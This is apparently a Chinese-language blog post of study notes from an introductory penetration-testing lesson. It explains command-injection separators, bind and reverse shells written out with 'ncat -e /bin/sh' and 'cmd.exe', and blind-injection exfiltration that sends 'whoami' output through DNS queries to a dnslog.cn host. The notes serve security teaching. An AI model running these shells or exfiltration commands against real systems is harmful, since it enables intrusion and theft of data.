---
title: "小迪安全 005：基础入门 - 反弹 Shell、无回显带外、正反向连接、防火墙与文件下载"
date: 2026-08-09T10:00:00
tags: ["Cybersecurity", "Learning Notes"]
---

无图形化下载文件可以用curl wget等
使用网站工具生成命令 
https://forum.ywhack.com/bountytips.php?download

##### 命令
**| pipe: 把左边命令的输出，交给右边命令作为输入。**
```
管道符：| (管道符号) ||（逻辑或） &&（逻辑与） &(后台任务符号)
Windows->          | & || &&
Linux->            ; | || & && (特有`` 和;)是TAB上面的那个键

例子：
ping -c 1 127.0.0.1 ; whoami
ping -c 1 127.0.0.1 | whoami
ping -c 1 127.0.0.1 || whoami
ping -c 1 127.0.0.1 & whoami
ping -c 1 127.0.0.1 && whoami
ping -c 1 127.0.0.1 whoami
```

## I. 正反向代理

正向代理：谁监听 就是要控制谁（本地等着别人来连）
反向代理：谁监听 就控制对方（别人主动给你，等待东西到）
#### 1. 正向连接（Bind Shell）

**特点：被控制方监听端口，控制方主动连接。**
##### Windows 控制 Linux
*Linux 被控制端：*
Linux 监听 5566 + 把 /bin/sh 交给这个连接
<mark>`ncat -e /bin/sh -lvp 5566`</mark>
*Windows 控制端：*
<mark>`nc <Linux_IP> 5566`</mark>
连接成功后，Windows 端输入的命令会交给 Linux 的 `/bin/sh` 执行。

##### Linux 控制 Windows
*Windows 被控制端：*
Windows 监听 5566 + 把 cmd.exe 交给这个连接
`ncat -e cmd.exe -lvp 5566`
*Linux控制端：*
`nc <Windows_IP> 5566`

正向连接就是：**<mark>被控制方开端口等待，控制方主动连过去。</mark>**

### 2. 反向连接（Reverse Shell）

**特点：控制方监听，被控制方主动连接出去，并把自己的 Shell 带过去。**

#### Windows 控制 Linux
**Linux交出控制权，Windows连接**
Windows 控制端先监听：
<mark>nc -lvvp 5566</mark>
Linux 被控制端主动连接 Windows：
<mark>ncat -e /bin/sh <Windows_IP> 5566</mark>
*把权限（/bin/sh）交给这个windows ip 的 5566端口*
##### Linux 控制 Windows
**Windows交出控制权，Linux连接**
Linux 控制端监听：
ncat -lvvp 5566
Windows 被控制端主动连接 Linux：
ncat -e cmd.exe <Linux_IP> 5566

---

正向 Shell：
控制端找目标机

反向 Shell：
目标机主动找控制端

反向 Shell 更常见的一个原因，就是目标机往往在 **NAT、防火墙、内网** 后面，外部不容易直接主动连进去；但目标机主动向外建立连接通常更容易。

##### 防火墙 & 正反连接
1. Windows攻击机
2. Linux目标

<mark>正向连接需要Linux绑定sh到5566之后Windows去访问这个Linux IP,属于入站，容易被防火墙拦住
反向连接是Linux主动连接Windows的IP, 主动出去不容易被拦住</mark>


## II. 数据回显
漏洞有，但是数据不回显
1. 反弹shell
2. 带外查询

找一个能ping的url：e24a3l.dnslog.cn

```
ping e24a3l.dnslog.cn
ping `whoami`.e24a3l.dnslog.cn
```

<mark>命令注入漏洞存在，但是网页没有把命令执行结果显示出来时，怎么确认命令执行成功，以及怎么把结果“带出来”。</mark>
<mark>这种情况通常叫 **无回显 / Blind Command Injection（盲命令注入）**。</mark>

网站存在命令执行漏洞
        ↓
whoami 确实在服务器执行了
        ↓
但网页不显示执行结果
        ↓
我怎么知道 whoami 的结果？
        ↓
方法 1：反弹 Shell
方法 2：DNSLog 带外查询
#### 1. `whoami` 其实执行成功了
(这里是windows服务器内部， 这里在展示)
第一张图里老师在 PowerShell 输入：

```powershell
$x=whoami
echo $x
```

得到：

```text
iz8nhhgtiuldwtz\administrator
```

所以 `whoami` 完全可以执行。
它的意思大概就是计算机名\用户名

老师接下来是想把这个结果通过 **DNS 请求** 发出去。

---
#### 2. 为什么要用 DNSLog？

比如一个存在漏洞的网站内部实际执行：

```text
ping 用户输入的内容
```

正常情况下，你输入：

```text
127.0.0.1
```

服务器执行：

```cmd
ping 127.0.0.1
```

假设存在命令注入，那么攻击者可能让服务器额外执行另一个命令。

问题在于：

```text
命令执行成功
↓
但是执行结果没有返回网页
```

例如执行了：

```cmd
whoami
```

服务器内部可能已经得到：

```text
iz8nhhgtiuldwtz\administrator
```

可是浏览器什么都看不到。

这就是老师笔记里：<mark>漏洞有，但是数据不回显</mark>

---

#### 3. DNSLog 就是想办法让服务器主动告诉我们结果

老师先拿到了一个 DNSLog 域名：e24a3l.dnslog.cn

DNSLog 的特点是：

如果服务器查询：`hello.e24a3l.dnslog.cn`
`ping hello.e24a3l.dnslog.cn`

DNSLog 网站就能看到：

```text
hello.e24a3l.dnslog.cn
```

因此可以把 `whoami` 的结果塞进子域名：

```text
[whoami结果].e24a3l.dnslog.cn
```

服务器只要进行一次 DNS 查询，DNSLog 页面就能看到这个字符串。

概念上就是：

```text
whoami
  ↓
administrator
  ↓
administrator.e24a3l.dnslog.cn
  ↓
服务器查询这个域名
  ↓
DNSLog 收到 DNS 请求
  ↓
在 DNSLog 网页看到 administrator
```

这就叫：

**OOB = Out-of-Band，带外通信/带外查询。**

---

#### 4. 为什么老师第一次 `ping` 失败？

这里才是你截图里比较关键的地方。

老师写：$x=whoami

此时：$x = iz8nhhgtiuldwtz\administrator

然后：

```powershell
$y='.e24a3l.dnslog.cn'
$z=$x+$y
```

那么 `$z` 变成：

```text
iz8nhhgtiuldwtz\administrator.e24a3l.dnslog.cn
```

接着：

```powershell
ping $z
```

报错：

```text
Ping 请求找不到主机...
请检查该名称，然后重试。
```

为什么？

因为这里有：

```text
\
```

DNS 域名不能这样写。

也就是说：

```text
iz8nhhgtiuldwtz\administrator.e24a3l.dnslog.cn
                ↑
              这个有问题
```

不是 `whoami` 执行不了，而是 **`whoami` 返回的数据不适合作为 DNS 域名的一部分**。

---

#### 5. 所以老师用了 `.Replace()`

于是截图第二张里有：

```powershell
$x=$x.replace('\','xxxx')
```

把：

```text
iz8nhhgtiuldwtz\administrator
```

改成：

```text
iz8nhhgtiuldwtzxxxxadministrator
```

这样就没有反斜杠了。

再拼接：

```powershell
$z=$x+$y
```

得到：

```text
iz8nhhgtiuldwtzxxxxadministrator.e24a3l.dnslog.cn
```

然后：

```powershell
ping $z
```

Windows 会先进行 DNS 查询：

```text
这个域名对应哪个 IP？
```

于是 DNS 查询就跑到了 DNSLog。

---

#### 6. 所以 DNSLog 页面出现了这个记录

你第三张截图里：

```text
iz8nhhgtiuldwtzxxxxadministrator.e24a3l.dnslog.cn
```

已经出现在 DNS Query Record 里面。

这证明两件事：

```text
① whoami 成功执行
② 结果是 iz8nhhgtiuldwtz\administrator
```

整个数据流非常重要：

```text
Windows Server
      │
      │ whoami
      ↓
iz8nhhgtiuldwtz\administrator
      │
      │ 替换 "\"
      ↓
iz8nhhgtiuldwtzxxxxadministrator
      │
      │ + DNSLog 域名
      ↓
iz8nhhgtiuldwtzxxxxadministrator.e24a3l.dnslog.cn
      │
      │ ping → 触发 DNS 查询
      ↓
       DNS
      ↓
DNSLog.cn
      ↓
网页记录 DNS Query
```

所以老师实际上是在**借 DNS 当作一个“返回通道”**。

---

#### 7. 为什么用 `ping`？

这里 `ping` 本身不是重点。

重点是：

```text
ping 域名
```

之前，操作系统必须先知道：

```text
这个域名对应什么 IP？
```

所以会触发：

```text
DNS Query
```

也就是说老师真正需要的是前面这一步：

```text
ping xxx.dnslog.cn
     ↓
DNS 查询 xxx.dnslog.cn
```

至于最后能不能真的 ping 通，其实不是重点。

你截图甚至看到解析成：

```text
127.0.0.1
```

也没关系。

重要的是 DNSLog 已经记录到：

```text
iz8nhhgtiuldwtzxxxxadministrator...
```

---

#### 8. 另外一种方法就是你截图里的“反弹 Shell”

老师笔记写：

```text
漏洞有，但是数据不回显：

1、反弹 shell
2、带外查询
```

这是两种不同思路。

**反弹 Shell：**

```text
目标 Windows
      │
      │ 主动建立连接
      ↓
测试者机器
      │
      ↓
获得交互式 cmd
```

于是就可以直接：

```cmd
whoami
ipconfig
dir
```

并直接看到结果。

而 **DNSLog** 不需要建立完整的交互 shell：

```text
执行命令
↓
拿到结果
↓
把结果编码/处理
↓
放进 DNS 查询
↓
DNSLog 查看
```

所以 DNSLog 更像是：

> **“我没有屏幕显示，那我让服务器通过 DNS 偷偷给我传个纸条。”**

---
